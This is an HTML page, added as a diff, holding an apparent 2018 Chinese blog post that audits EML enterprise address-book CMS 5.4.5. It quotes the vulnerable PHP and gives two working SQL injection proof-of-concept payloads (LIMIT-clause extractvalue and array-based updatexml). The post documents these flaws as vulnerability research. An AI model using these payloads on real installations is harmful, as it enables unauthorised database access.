@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>EML企业通讯录管理系统两处注入分析 | b1ng0&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00 前言最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。 0x01 漏洞环境CMS：EML企业通讯录管理系统 版本：5.4.5 官方网站：http://bbs.emlsoft.com  更新时间：2018.7.26  测试环境：windows10+phpstudy+php5.5 0x02 漏洞分析过滤函数：对于小">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EML企业通讯录管理系统两处注入分析">
+<meta property="og:url" content="http://b1ng0.top/2018/08/12/EML企业通讯录管理系统两处注入分析/index.html">
+<meta property="og:site_name" content="b1ng0&#39;s blog">
+<meta property="og:description" content="0x00 前言最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。 0x01 漏洞环境CMS：EML企业通讯录管理系统 版本：5.4.5 官方网站：http://bbs.emlsoft.com  更新时间：2018.7.26  测试环境：windows10+phpstudy+php5.5 0x02 漏洞分析过滤函数：对于小">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://b1ng0.top/images/sqli1.PNG">
+<meta property="og:image" content="http://b1ng0.top/images/sqli2.PNG">
+<meta property="og:updated_time" content="2020-05-19T12:00:32.540Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="EML企业通讯录管理系统两处注入分析">
+<meta name="twitter:description" content="0x00 前言最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。 0x01 漏洞环境CMS：EML企业通讯录管理系统 版本：5.4.5 官方网站：http://bbs.emlsoft.com  更新时间：2018.7.26  测试环境：windows10+phpstudy+php5.5 0x02 漏洞分析过滤函数：对于小">
+<meta name="twitter:image" content="http://b1ng0.top/images/sqli1.PNG">
+  
+    
+      
+        <link rel="alternate" type="application/atom+xml" title="b1ng0&#39;s blog" href="/atom.xml">
+      
+    
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/typing.css">
+  <link rel="stylesheet" href="/css/donate.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  
+</head>
+
+  
+    
+      <body>
+    
+  
+      <div id="container" class="container">
+        <article id="post-EML企业通讯录管理系统两处注入分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <header id="header" class="header">
+  <nav class="mobile-nav">
+    <h1 class="nickname">b1ng0</h1>
+    <ul class="mobile-nav-menu">
+      <label for="mobile-menu-toggle"><a id="menu-button">&#9776; Menu</a></label>
+      <input type="checkbox" id="mobile-menu-toggle"/>
+      <ul class="mobile-nav-link">
+        
+        <a href="/">Home</a>
+        
+        <a href="/archives">Archives</a>
+        
+        <a href="/about">About</a>
+        
+      </ul>
+    </ul>
+  </nav>
+	
+		<nav id="main-nav" class="main-nav nav-left">
+	
+	
+	  <a class="main-nav-link" href="/">Home</a>
+	
+	  <a class="main-nav-link" href="/archives">Archives</a>
+	
+	  <a class="main-nav-link" href="/about">About</a>
+	
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      EML企业通讯录管理系统两处注入分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry typo" itemprop="articleBody">
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。</p>
+<h1 id="0x01-漏洞环境"><a href="#0x01-漏洞环境" class="headerlink" title="0x01 漏洞环境"></a>0x01 漏洞环境</h1><p>CMS：EML企业通讯录管理系统</p>
+<p>版本：5.4.5</p>
+<p>官方网站：<a href="http://bbs.emlsoft.com" target="_blank" rel="noopener">http://bbs.emlsoft.com</a> </p>
+<p>更新时间：2018.7.26 </p>
+<p>测试环境：windows10+phpstudy+php5.5</p>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h3 id="过滤函数："><a href="#过滤函数：" class="headerlink" title="过滤函数："></a>过滤函数：</h3><p>对于小cms的sql注入的审计，一般存在两个方向：</p>
+<ol>
+<li>系统过滤机制的正面bypass;</li>
+<li>过滤的盲区(如：GPC之外的注入、limit/orderby之后的注入、二次入库的注入以及忘记过滤的地方等.);</li>
+</ol>
+<p>当然，后者出现的概率更大并且也更好挖一点，先来看看过滤函数：</p>
+<p>/lib/func.class.php:(27-37行)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安全验证</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span><span class="params">(&amp;$svar)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!get_magic_quotes_gpc())	&#123;</span><br><span class="line">		<span class="keyword">if</span>( is_array($svar) )&#123;</span><br><span class="line">			<span class="keyword">foreach</span>($svar <span class="keyword">as</span> $k =&gt; $v) $svar[$k] = _RunMagicQuotes($v);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$svar = addslashes($svar);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $svar;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>未开启GPC则使用addslashes，也考虑到了数组的情况。感觉只要使用得当，就应该没有什么问题。</p>
+<h3 id="第一处注入："><a href="#第一处注入：" class="headerlink" title="第一处注入："></a>第一处注入：</h3><p>action/action.address.php：（60-68行）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//设置分页</span></span><br><span class="line"><span class="keyword">if</span>($_POST[numPerPage]==<span class="string">""</span>)&#123;$numPerPage=<span class="string">"10"</span>;&#125;<span class="keyword">else</span>&#123;$numPerPage=$_POST[numPerPage];&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[pageNum]==<span class="string">""</span>||$_GET[pageNum]==<span class="string">"0"</span> )&#123;$pageNum=<span class="string">"0"</span>;&#125;<span class="keyword">else</span>&#123;$pageNum=($_GET[pageNum]<span class="number">-1</span>)*$numPerPage;&#125;</span><br><span class="line">$num=mysql_query(<span class="string">"select * from eml_address_list where 1=1 $search"</span>);<span class="comment">//当前频道条数</span></span><br><span class="line">$total=mysql_num_rows($num);<span class="comment">//总条数	</span></span><br><span class="line">$page=<span class="keyword">new</span> page(<span class="keyword">array</span>(<span class="string">'total'</span>=&gt;$total,<span class="string">'perpage'</span>=&gt;$numPerPage));</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询</span></span><br><span class="line">$sql=<span class="string">"select * from eml_address_list  where 1=1  $search order by id desc limit $pageNum,$numPerPage"</span>;</span><br></pre></td></tr></table></figure>
+<p>$pageNum $numPerPage 未进行过滤处理直接带入了查询语句，但是前者应该无法利用：<code>（$pageNum=($_GET[pageNum]-1)*$numPerPage;）</code></p>
+<p>后者位于limit中并且存在order by，(<a href="http://www.freebuf.com/articles/web/57528.html" target="_blank" rel="noopener">参考文章</a>)可使用如下利用方式。</p>
+<p>POC：</p>
+<p><code>numPerPage=1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),0x7e);</code></p>
+<p><img src="/images/sqli1.PNG" alt></p>
+<h3 id="第二处注入："><a href="#第二处注入：" class="headerlink" title="第二处注入："></a>第二处注入：</h3><p>action/action.address.php：（186-206行)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//批量删除</span></span><br><span class="line"><span class="keyword">if</span>($do==<span class="string">"del_all"</span>)&#123;</span><br><span class="line">	If_rabc($action,$do); <span class="comment">//检测权限</span></span><br><span class="line">	is_admin($action,$do); <span class="comment">//检测权限</span></span><br><span class="line">	$arr = $_POST[<span class="string">"item"</span>];</span><br><span class="line">	$count_arr=count($arr); </span><br><span class="line">	<span class="keyword">if</span>($count_arr==<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> error($msg); </span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$str = implode(<span class="string">"','"</span>,$arr);<span class="comment">//拼接字符</span></span><br><span class="line">	</span><br><span class="line">	$sql = <span class="string">"delete from eml_address_list WHERE id in('&#123;$str&#125;')"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>($db-&gt;query($sql))&#123;<span class="keyword">echo</span> success($msg,<span class="string">"?action=address"</span>);&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> error($msg);&#125;</span><br></pre></td></tr></table></figure>
+<p>item参数通过POST方法传入，使用implode函数进行数组=&gt;字符串，然后未经过滤直接进入delete语句执行，同样是忘记使用过滤函数的问题，不同点是必须传入数组才能利用，当然此处检测了is_admin，需要后台权限才能利用，比上一处利用条件更苛刻。</p>
+<p>POC:</p>
+<p><code>item[]=2&#39;) or updatexml(1,concat(0x7e,(version())),0) -- dd</code></p>
+<p><img src="/images/sqli2.PNG" alt></p>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>感觉简单的太简单，难的又审不动，要走的路还很长呢。。。 </p>
+
+      
+      
+    </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/2018/08/12/EML企业通讯录管理系统两处注入分析/" class="article-date">
+  <time class="dt-published" datetime="2018-08-11T16:00:00.000Z" itemprop="datePublished">2018-08-12</time>
+</a>
+
+        </li>
+        
+        
+          <li>
+            <span class="label">Tag:</span>
+            
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+
+
+          </li>
+        
+        <hr/>
+      </ul>
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <a href="/2018/11/15/Blank Bypass/" id="article-nav-newer" class="article-nav-link-wrap newer">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Blank Bypass
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/05/21/Socks5_proxy/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Socks5_proxy</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      
+      <hr/>
+      <div id="footerContent" class="footer-content">
+       
+
+      </div>
+    </footer>
+
+      
+
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+
+<script src="/js/typing.js"></script>
+<!--[if lt IE 9]><script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script><![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
+</html>
